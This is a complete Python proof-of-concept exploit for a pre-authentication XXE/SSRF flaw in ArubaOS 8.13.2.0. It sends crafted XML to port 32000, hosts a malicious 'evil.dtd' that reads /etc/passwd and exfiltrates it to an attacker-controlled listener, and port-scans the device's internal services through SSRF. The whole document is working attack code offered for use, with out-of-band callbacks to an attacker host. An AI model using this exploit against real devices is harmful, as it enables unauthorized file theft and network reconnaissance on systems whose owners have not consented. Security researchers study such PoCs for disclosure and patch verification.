#!/usr/bin/env python3
"""
ArubaOS 8.13.2.0 - Pre-Auth XXE SSRF Full PoC
Author: Vesqer / JM00NJ
Target: http://<device-ip>:32000/

Steps:
  1. OOB HTTP callback (inline entity)
  2. External DTD fetch (evil.dtd)
  3. Internal port scan via SSRF
  4. OOB file read attempt (file:///etc/passwd)
"""

import socket
import threading
import http.server
import subprocess
import os
import time
import argparse

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TARGET_IP   = "192.168.56.50"
TARGET_PORT = 32000
ATTACKER_IP = "192.168.56.102"
OOB_PORT    = 9999
DTD_PORT    = 8080
# ──────────────────────────────────────────────────────────────────────────────

INTERNAL_PORTS = [22, 80, 443, 4343, 8080, 8443, 3306, 5432, 9200]
results = {}

# ─── OOB LISTENER ─────────────────────────────────────────────────────────────
def oob_listener(port, label, timeout=6):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        s.settimeout(timeout)
        conn, addr = s.accept()
        conn.settimeout(3)
        try:
            data = conn.recv(4096)
        except socket.timeout:
            data = b""
        conn.close()
        results[label] = f"[+] CALLBACK from {addr[0]} | {repr(data[:300])}"
    except socket.timeout:
        results[label] = f"[-] No callback (timeout {timeout}s)"
    except Exception as e:
        results[label] = f"[!] {e}"
    finally:
        s.close()

# ─── DTD HTTP SERVER ──────────────────────────────────────────────────────────
class SilentHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print(f"    [DTD] {args[0]} {args[1]}")

def start_dtd_server(directory, port):
    orig = os.getcwd()
    os.chdir(directory)
    httpd = http.server.HTTPServer(("0.0.0.0", port), SilentHandler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    os.chdir(orig)
    return httpd

# ─── PAYLOAD SENDER ───────────────────────────────────────────────────────────
def send_xml(target_ip, target_port, xml, timeout=6):
    cmd = [
        "curl", "-s", "-i", "-X", "POST",
        f"http://{target_ip}:{target_port}/",
        "-H", "Content-Type: text/xml",
        "--max-time", str(timeout),
        "-d", xml,
    ]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 2)
        return out.stdout
    except Exception as e:
        return f"curl error: {e}"

# ─── STEP 1: OOB HTTP CALLBACK ────────────────────────────────────────────────
def step1_oob_callback(target_ip, attacker_ip, oob_port):
    print(f"\n[STEP 1] OOB HTTP Callback — listener :{oob_port}")
    t = threading.Thread(
        target=oob_listener,
        args=(oob_port, "step1", 7),
        daemon=True
    )
    t.start()
    time.sleep(0.3)

    xml = (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{attacker_ip}:{oob_port}/test">]>\n'
        '<aruba><opcode>&xxe;</opcode></aruba>'
    )
    send_xml(target_ip, TARGET_PORT, xml)
    t.join(timeout=8)
    print(f"  {results.get('step1', '[-] No result')}")

# ─── STEP 2: EXTERNAL DTD FETCH ───────────────────────────────────────────────
def step2_dtd_fetch(target_ip, attacker_ip, oob_port, dtd_port, dtd_dir):
    print(f"\n[STEP 2] External DTD Fetch — DTD server :{dtd_port}, OOB :{oob_port}")

    # Write evil.dtd
    dtd = (
        '<?xml version="1.0"?>\n'
        '<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
        '<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM '
        f"'http://{attacker_ip}:{oob_port}/?d=%file;'\">\n"
        '%wrap;\n%send;\n'
    )
    dtd_path = os.path.join(dtd_dir, "evil.dtd")
    with open(dtd_path, "w") as f:
        f.write(dtd)
    print(f"  [+] evil.dtd written to {dtd_path}")

    httpd = start_dtd_server(dtd_dir, dtd_port)
    print(f"  [+] DTD HTTP server started on :{dtd_port}")

    # OOB listener for file exfil
    t = threading.Thread(
        target=oob_listener,
        args=(oob_port, "step2", 8),
        daemon=True
    )
    t.start()
    time.sleep(0.3)

    xml = (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE foo SYSTEM "http://{attacker_ip}:{dtd_port}/evil.dtd">\n'
        '<aruba><opcode>test</opcode></aruba>'
    )
    send_xml(target_ip, TARGET_PORT, xml, timeout=8)
    t.join(timeout=10)

    r = results.get("step2", "[-] No result")
    print(f"  {r}")
    if "?d=" in r:
        start = r.find("?d=") + 3
        exfil = r[start:r.find("'", start)] if "'" in r[start:] else r[start:start+200]
        print(f"  [!!!] FILE CONTENT EXFILTRATED: {exfil}")

    httpd.shutdown()

# ─── STEP 3: INTERNAL PORT SCAN ───────────────────────────────────────────────
def step3_port_scan(target_ip, ports):
    print(f"\n[STEP 3] Internal Port Scan via SSRF — 127.0.0.1")
    print(f"  Scanning ports: {ports}\n")

    open_ports = []
    for port in ports:
        xml = (
            '<?xml version="1.0"?>\n'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:{port}/">]>\n'
            '<aruba><opcode>&xxe;</opcode></aruba>'
        )
        resp = send_xml(target_ip, TARGET_PORT, xml, timeout=3)
        if "<dialog>success</dialog>" in resp or len(resp) > 100:
            status = "[OPEN]"
            open_ports.append(port)
        else:
            status = "[closed]"
        print(f"  Port {port:<6} {status}")
        time.sleep(0.2)

    print(f"\n  Open ports: {open_ports if open_ports else 'none detected'}")
    results["port_scan"] = open_ports

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="ArubaOS XXE Full PoC")
    parser.add_argument("--target",   default=TARGET_IP)
    parser.add_argument("--attacker", default=ATTACKER_IP)
    parser.add_argument("--oob-port", type=int, default=OOB_PORT)
    parser.add_argument("--dtd-port", type=int, default=DTD_PORT)
    parser.add_argument("--step",     type=int, default=0,
                        help="Run specific step only (1/2/3), 0 = all")
    args = parser.parse_args()

    dtd_dir = "/tmp/xxe_poc"
    os.makedirs(dtd_dir, exist_ok=True)

    print(f"\n{'='*60}")
    print(f"  ArubaOS XXE Full PoC | Target: {args.target}:{TARGET_PORT}")
    print(f"  Attacker: {args.attacker}")
    print(f"{'='*60}")

    if args.step in (0, 1):
        step1_oob_callback(args.target, args.attacker, args.oob_port)

    if args.step in (0, 2):
        step2_dtd_fetch(
            args.target, args.attacker,
            args.oob_port, args.dtd_port, dtd_dir
        )

    if args.step in (0, 3):
        step3_port_scan(args.target, INTERNAL_PORTS)

    # ── Summary ──────────────────────────────────────────────────
    print(f"\n{'='*60}")
    print("  SUMMARY")
    print(f"{'='*60}")
    print(f"  Step 1 OOB    : {results.get('step1', 'skipped')}")
    print(f"  Step 2 DTD    : {results.get('step2', 'skipped')}")
    print(f"  Step 3 ports  : {results.get('port_scan', 'skipped')}")

    confirmed = [k for k, v in results.items() if "[+]" in str(v) or (isinstance(v, list) and v)]
    if confirmed:
        print(f"\n  [!] Confirmed: {', '.join(confirmed)}")
    print()

if __name__ == "__main__":
    main()
